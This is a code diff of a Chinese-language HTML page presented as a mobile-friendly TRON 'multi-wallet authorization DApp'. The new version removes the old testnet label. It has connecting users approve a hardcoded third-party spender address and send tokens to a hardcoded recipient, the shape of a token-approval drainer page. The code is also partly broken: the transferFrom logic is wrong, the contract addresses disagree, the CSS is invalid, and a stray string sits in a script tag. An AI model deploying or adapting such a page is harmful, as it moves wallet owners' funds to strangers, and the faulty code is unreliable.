@@ -1,102 +1,244 @@
-
 <!DOCTYPE html>
 <html lang="zh">
 <head>
-    <meta charset="UTF-8">
-    <title>TRON Nile 授权 DApp</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+  <title>TRON 多钱包授权 DApp（手机适配）</title>
+  <!-- 可选：桌面环境备用 tronweb（移动端钱包会自己注入 window.tronWeb） -->
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+  <style>
+    :root { --primary:#2563eb; --bg:#0b1020; --card:#0f172a; --text:#e2e8f0; --muted:#94a3b8; }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, "Noto Sans SC", "PingFang SC", "Microsoft YaHei", sans-serif;
+      background: linear-gradient(180deg, #0b1020, #111827);
+      color: var(--text); min-height: 100vh; display: flex; align-items: center; justify-content: center;
+    }
+    .wrap { width: 100%; max-width: 560px; padding: 16px; }
+    .card {
+      background: rgba(15,23,42,.85); border: 1px solid rgba(255,255,255,.06);
+      border-radius: 16px; padding: 16px; box-shadow: 0 10px 30px rgba(0,0,0,.35);
+      backdrop-filter: blur(8px);
+    }
+    h1 { font-size: 1.25rem; margin: 0 0 8px; }
+    .sub { color: var(--muted); font-size: .9rem; margin-bottom: 12px; }
+    .row { display: grid; grid-template-columns: 1fr; gap: 8px; }
+    .kv { background:#0b1327; border:1px solid rgba(255,255,255,.06); padding:10px; border-radius:12px; font-size:.9rem; word-break:break-all; }
+    .btn {
+      width: 100%; padding: 14px 16px; font-size: 1rem; border: 0; border-radius: 12px; color: #fff;
+      background: linear-gradient(135deg, #2563eb, #4f46e5); box-shadow: 0 8px 16px rgba(37,99,235,.35);
+      active: transform: translateY(1px);
+    }
+    .btn.secondary { background: #334155; }
+    .grid { display:grid; grid-template-columns:1fr 1fr; gap:8px; }
+    .muted { color: var(--muted); font-size: .85rem; }
+    .sp { height:8px; }
+    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; }
+    @media (min-width: 560px){ h1{ font-size:1.4rem; } .btn{ font-size:1.05rem; } }
+  </style>
 </head>
 <body>
-    <h2>TRON Nile 测试链 TRC-20 授权 DApp（自动连接版）</h2>
-    <button onclick="connectWallet()">连接钱包</button>
-    <button onclick="approve()">Approve 授权</button>
-    <button onclick="transferFrom()">TransferFrom 转账</button>
-    <button onclick="checkAllowance()">查看授权额度</button>
-    <button onclick="disconnectWallet()">断开连接</button>
+  <div class="wrap">
+    <div class="card">
+      <h1>TRON 多钱包授权 DApp</h1>
+      <div class="sub">支持手机 TP / TronLink / Bitget / imToken，以及桌面 TronLink</div>
 
-    <script>TRZUg9uPHuuFeNmCfCEN8rqFsWHQMKuWgz
-        const CONTRACT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // Nile USDT 合约
-        const SPENDER_ADDRESS = "TU2RPHf949o8QcESqXpCicXeRVfijj6D3k"; // 被授权人地址
-        const AMOUNT = 100 * 1e6; // 授权数量 (USDT 最小单位是 1e6)
+      <div class="row">
+        <div class="kv"><b>钱包地址</b><br><span id="addr" class="mono">未连接</span></div>
+        <div class="kv"><b>网络</b><br><span id="network" class="mono">未知</span></div>
+      </div>
 
-        let tronWeb;
+      <div class="sp"></div>
+      <button class="btn" onclick="connectWallet()">连接钱包</button>
+      <div class="grid">
+        <button class="btn" onclick="approve()">Approve 授权</button>
+        <button class="btn" onclick="checkAllowance()">查看授权额度</button>
+        <button class="btn secondary" onclick="transferDirect()">Transfer（直接转账）</button>
+        <button class="btn secondary" onclick="transferFrom()">TransferFrom（用授权）</button>
+      </div>
+      <div class="sp"></div>
+      <button class="btn secondary" onclick="disconnectWallet()">断开连接</button>
 
-        async function connectWallet() {
-            if (window.tronLink) {
-                try {
-                    await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    tronWeb = window.tronWeb;
-                    console.log("已连接钱包:", tronWeb.defaultAddress.base58);
-                    alert("已连接钱包: " + tronWeb.defaultAddress.base58);
-                } catch (e) {
-                    console.error(e);
-                    alert("连接钱包失败: " + e.message);
-                }
-            } else {
-                alert("请安装 TronLink 并连接 Nile 网络");
-            }
-        }
+      <div class="sp"></div>
+      <div class="kv">
+        <b>当前参数（可在代码顶部修改）</b>
+        <div class="mono" id="params"></div>
+        <div class="muted">提示：TRC‑20 常见精度为 6，USDT(Nile) 合约：<code>TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf</code></div>
+      </div>
 
-        async function disconnectWallet() {
-            tronWeb = null;
-            alert("已断开钱包连接");
-        }
+      <div class="sp"></div>
+      <div class="kv"><b>状态</b><br><div id="status" class="mono">等待操作…</div></div>
+    </div>
+  </div>
 
-        async function approve() {
-            if (!tronWeb) return alert("请先连接钱包");
-            const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
-            try {
-                const tx = await contract.approve(SPENDER_ADDRESS, AMOUNT).send();
-                alert("Approve TX Hash: " + tx);
-            } catch (e) {
-                console.error(e);
-                alert("授权失败: " + e.message);
-            }
-        }
+<script>
+// ===== 你可以在这里固定参数 =====
+const CONTRACT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // 代币合约（默认：Nile USDT）
+const SPENDER_ADDRESS  = "TU2RPHf949o8QcESqXpCicXeRVfijj6D3k";  // 被授权人地址（发起 transferFrom 的地址）
+const RECIPIENT_ADDRESS= "TMha7c19AkZ9Zg4WTqNHSucBviFHUBPUqk";  // 接收地址（transfer / transferFrom 的 to）
+const DECIMALS         = 6;          // 代币精度（USDT=6）
+const APPROVE_AMOUNT   = "1000";      // 授权数量（人类可读）
+const TRANSFER_AMOUNT  = "50";        // 直接转账/授权转账 数量
+// =================================
 
-        async function transferFrom() {
-            if (!tronWeb) return alert("请先连接钱包");
-            const owner = prompt("请输入授权人地址:");
-            const to = prompt("请输入接收人地址:");
-            const amount = prompt("请输入转账数量 (整数):") * 1e6;
-            const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
-            try {
-                const tx = await contract.transferFrom(owner, to, amount).send();
-                alert("TransferFrom TX Hash: " + tx);
-            } catch (e) {
-                console.error(e);
-                alert("转账失败: " + e.message);
-            }
-        }
+let tronWeb = null;
+let currentAddress = null;
 
+const $ = (id) => document.getElementById(id);
+const setStatus = (msg) => { $("status").textContent = msg; };
+const humanToUnits = (valStr) => {
+  // 将 "123.45" -> BigInt(123450000) 依据 DECIMALS
+  const [intPart, fracRaw=""] = String(valStr).split(".");
+  const frac = (fracRaw + "0".repeat(DECIMALS)).slice(0, DECIMALS);
+  return BigInt(intPart + frac);
+};
+const unitsToHuman = (bn) => {
+  const s = bn.toString();
+  if (DECIMALS === 0) return s;
+  const pad = s.padStart(DECIMALS + 1, "0");
+  const i = pad.slice(0, -DECIMALS);
+  const f = pad.slice(-DECIMALS).replace(/0+$/,"");
+  return f ? i + "." + f : i;
+};
 
-        async function checkAllowance() {
-            if (!tronWeb) return alert("请先连接钱包");
-            const owner = tronWeb.defaultAddress.base58;
-            const contract = await tronWeb.contract().at(CONTRACT_ADDRESS);
-            try {
-                const allowance = await contract.allowance(owner, SPENDER_ADDRESS).call();
-                alert("授权额度: " + allowance.remaining.toString() / 1e6 + " USDT");
-            } catch (e) {
-                console.error(e);
-                alert("查询授权失败: " + e.message);
-            }
-        }
+function renderParams(){
+  $("params").innerText =
+`Token: ${CONTRACT_ADDRESS}
+Spender: ${SPENDER_ADDRESS}
+Recipient: ${RECIPIENT_ADDRESS}
+Decimals: ${DECIMALS}
+ApproveAmount: ${APPROVE_AMOUNT}
+TransferAmount: ${TRANSFER_AMOUNT}`;
+}
 
-        // 页面加载时自动尝试连接 TronLink
-        window.addEventListener('load', async () => {
-            if (window.tronLink) {
-                try {
-                    await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    tronWeb = window.tronWeb;
-                    console.log("自动连接成功:", tronWeb.defaultAddress.base58);
-                } catch (e) {
-                    console.warn("自动连接失败:", e.message);
-                }
-            } else {
-                console.warn("未检测到 TronLink");
-            }
-        });
-    </script>
+async function detectNetwork(){
+  try{
+    if (!tronWeb) return;
+    // Nile 节点通常包含 nile 关键字；仅作提示用途
+    const nodeInfo = await tronWeb.trx.getNodeInfo();
+    const pretty = (nodeInfo && nodeInfo.configNodeInfo && nodeInfo.configNodeInfo.codeVersion) ? "TRON " + nodeInfo.configNodeInfo.codeVersion : "TRON";
+    $("network").textContent = pretty + (tronWeb.fullNode?.host ? (" @ " + tronWeb.fullNode.host) : "");
+  }catch(e){
+    $("network").textContent = "已连接（节点信息不可用）";
+  }
+}
+
+async function connectWallet(){
+  try{
+    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
+      // 移动端钱包（TP/TronLink/Bitget 等）直接注入
+      tronWeb = window.tronWeb;
+    } else if (window.tronLink){
+      // 桌面插件（TronLink）
+      await window.tronLink.request({ method: 'tron_requestAccounts' });
+      tronWeb = window.tronWeb;
+    } else {
+      alert("请在 TP、TronLink 或其他 TRON 钱包的 DApp 浏览器中打开此页面");
+      return;
+    }
+    currentAddress = tronWeb.defaultAddress.base58;
+    $("addr").textContent = currentAddress;
+    setStatus("钱包已连接");
+    detectNetwork();
+  }catch(err){
+    console.error(err);
+    setStatus("连接失败: " + (err.message || String(err)));
+  }
+}
+
+function disconnectWallet(){
+  tronWeb = null;
+  currentAddress = null;
+  $("addr").textContent = "未连接";
+  setStatus("已断开连接（如需彻底断开，请在钱包内移除站点授权）");
+  $("network").textContent = "未知";
+}
+
+async function getContract(){
+  if (!tronWeb) throw new Error("请先连接钱包");
+  return await tronWeb.contract().at(CONTRACT_ADDRESS);
+}
+
+async function approve(){
+  try{
+    if (!tronWeb) return setStatus("请先连接钱包");
+    const contract = await getContract();
+    const amount = humanToUnits(APPROVE_AMOUNT);
+    setStatus("发送授权交易中...");
+    const tx = await contract.approve(SPENDER_ADDRESS, amount.toString()).send();
+    setStatus("授权已发送，Tx: " + tx);
+  }catch(err){
+    console.error(err);
+    setStatus("授权失败: " + (err?.message || String(err)));
+  }
+}
+
+async function checkAllowance(){
+  try{
+    if (!tronWeb) return setStatus("请先连接钱包");
+    if (!currentAddress) currentAddress = tronWeb.defaultAddress.base58;
+    const contract = await getContract();
+    const res = await contract.allowance(currentAddress, SPENDER_ADDRESS).call();
+    // 兼容不同合约返回：res可能是{remaining: BN}或一个大数
+    let raw = res?.remaining ?? res;
+    if (typeof raw === "object" && raw._hex) { raw = BigInt(raw._hex); }
+    else if (typeof raw === "string") { raw = BigInt(raw); }
+    else if (typeof raw === "number") { raw = BigInt(raw); }
+    const human = unitsToHuman(raw);
+    setStatus("当前授权额度: " + human);
+  }catch(err){
+    console.error(err);
+    setStatus("查询失败: " + (err?.message || String(err)));
+  }
+}
+
+async function transferDirect(){
+  try{
+    if (!tronWeb) return setStatus("请先连接钱包");
+    const contract = await getContract();
+    const amount = humanToUnits(TRANSFER_AMOUNT);
+    setStatus("发送直接转账交易中...");
+    // 标准 TRC20 transfer(address to, uint256 amount)
+    const tx = await contract.transfer(RECIPIENT_ADDRESS, amount.toString()).send();
+    setStatus("Transfer 已发送，Tx: " + tx);
+  }catch(err){
+    console.error(err);
+    setStatus("Transfer 失败: " + (err?.message || String(err)));
+  }
+}
+
+async function transferFrom(){
+  try{
+    if (!tronWeb) return setStatus("请先连接钱包");
+    if (!currentAddress) currentAddress = tronWeb.defaultAddress.base58;
+    // 注意：发起该交易的钱包（msg.sender）必须等于 SPENDER_ADDRESS
+    if (currentAddress && SPENDER_ADDRESS && currentAddress !== SPENDER_ADDRESS){
+      setStatus("警告：当前连接的钱包不是被授权的 SPENDER，transferFrom 可能会失败。");
+    }
+    const contract = await getContract();
+    const amount = humanToUnits(TRANSFER_AMOUNT);
+    setStatus("发送 transferFrom 交易中...");
+    const tx = await contract.transferFrom(currentAddress, RECIPIENT_ADDRESS, amount.toString()).send();
+    setStatus("transferFrom 已发送，Tx: " + tx);
+  }catch(err){
+    console.error(err);
+    setStatus("transferFrom 失败: " + (err?.message || String(err)));
+  }
+}
+
+// 页面加载时若已注入 tronWeb，自动显示地址
+window.addEventListener("load", () => {
+  renderParams();
+  setTimeout(() => {
+    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
+      tronWeb = window.tronWeb;
+      currentAddress = tronWeb.defaultAddress.base58;
+      $("addr").textContent = currentAddress;
+      setStatus("已检测到钱包环境");
+      detectNetwork();
+    }
+  }, 500);
+});
+</script>
 </body>
 </html>
